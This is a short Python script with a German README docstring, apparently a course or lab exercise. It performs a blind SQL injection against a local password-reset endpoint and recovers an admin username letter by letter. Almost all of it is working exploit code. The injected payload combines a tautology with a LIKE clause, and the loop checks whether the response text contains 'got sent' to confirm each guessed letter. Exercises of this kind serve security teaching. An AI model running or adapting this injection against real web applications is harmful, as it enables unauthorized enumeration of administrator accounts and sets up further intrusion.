"""
README
- Gestartet wird das Skript ueber "python BlindSqlInjection.py"
- Es gibt den Adminnamen in der Konsole aus
- Die Laufzeit ist linear in der Laenge des Namens, da fuer jeden Buchstaben im Namen
  die while-Schleife einmal durchlaufen wird. Die for-Schleife wird fuer jeden Buchstaben
  maximal 26 mal durchlaufen.
"""


import requests
from string import ascii_lowercase

name = ''
while 'got sent' not in requests.post(
        'http://localhost:8081/retrieve_password',
        data={'username': "' or ''='' and username like '" + name + "' and admin=1 -- '"}).text:
    for c in ascii_lowercase:
        query = "' or ''='' and username like '" + name + c + "%' and admin=1 -- '"
        req = requests.post(
            'http://localhost:8081/retrieve_password',
            data={'username': query})
        if 'got sent' in req.text:
            name += c
            break

print(name)
